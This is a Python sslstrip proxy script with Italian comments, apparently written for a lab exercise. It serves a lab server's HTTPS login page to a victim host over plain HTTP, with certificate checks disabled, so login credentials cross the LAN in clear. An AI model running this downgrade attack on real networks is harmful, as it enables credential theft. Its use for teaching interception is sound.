#!/usr/bin/env python3
"""Proxy sslstrip in Python puro: equivalente di sslstrip_addon.py SENZA mitmproxy.

Stesso comportamento didattico dell'addon mitmproxy (vedi sslstrip_addon.py):
quando Alice naviga in HTTP, il proxy NON inoltra al server in chiaro (che
risponderebbe 301 -> https://bob.local/login). Recupera lui stesso la pagina
HTTPS da Bob (certificato self-signed, non verificato) e la restituisce ad
Alice su HTTP IN CHIARO. Le POST di login vengono inoltrate a Bob via HTTPS,
ma transitano in chiaro sulla LAN tra Alice e il proxy.

PERCHE' QUESTO E NON mitmproxy: il nodo Darth e' i386 (32-bit) e mitmproxy
non distribuisce binari standalone a 32 bit; pip su quella distro datata e'
fragile. Questo proxy usa solo la stdlib (http.server, ssl, urllib) -> gira
su qualunque Python 3, inclusi i386.

Uso (su Darth, da lab_08/):  python3 ./mitm/sslstrip_proxy.py
Alice usa Darth come proxy HTTP esplicito su 10.0.0.30:8080
(es. curl -x http://10.0.0.30:8080 http://bob.local/).
"""
import ssl
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

LISTEN = ("0.0.0.0", 8080)
UPSTREAM = "https://10.0.0.20"  # Bob, IP diretto, certificato self-signed

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


def _fetch(method, path, body, content_type):
    headers = {"Host": "bob.local"}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(
        UPSTREAM + path, data=body, method=method, headers=headers
    )
    with urllib.request.urlopen(req, context=_CTX) as resp:
        return resp.read(), resp.headers.get("content-type", "text/html")


class Handler(BaseHTTPRequestHandler):
    def _serve(self, body, ctype):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _path(self):
        # Con proxy esplicito la request line è assoluta
        # ('POST http://bob.local/login'): estraiamo solo il path.
        return urlsplit(self.path).path or self.path

    def do_GET(self):
        # GET in HTTP: anziche' lasciar rispondere Bob con 301 -> https://,
        # recuperiamo noi la pagina HTTPS e la serviamo in chiaro.
        content, ctype = _fetch("GET", "/login", None, "")
        self._serve(content, ctype)

    def do_POST(self):
        # Inoltra le POST di login a Bob via HTTPS; la risposta torna in chiaro.
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else None
        if self._path() == "/login":
            content, _ = _fetch(
                "POST", "/login", body,
                self.headers.get("Content-Type", ""),
            )
            self._serve(content, "text/plain")
        else:
            content, ctype = _fetch("GET", "/login", None, "")
            self._serve(content, ctype)


if __name__ == "__main__":
    print(f"sslstrip proxy in ascolto su {LISTEN[0]}:{LISTEN[1]} -> {UPSTREAM}")
    ThreadingHTTPServer(LISTEN, Handler).serve_forever()
